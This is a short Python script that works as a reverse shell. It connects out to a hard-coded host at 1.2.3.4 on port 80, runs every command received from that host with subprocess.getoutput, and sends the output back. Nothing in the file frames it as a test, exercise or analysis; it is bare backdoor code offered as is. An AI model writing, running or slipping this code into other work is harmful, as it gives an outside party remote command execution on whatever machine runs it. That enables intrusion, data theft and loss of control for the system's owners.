import subprocess, socket

ip = "1.2.3.4"
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((ip, port))

while True:
    c = s.recv(1024).decode('ascii')
    s.sendall(subprocess.getoutput(c))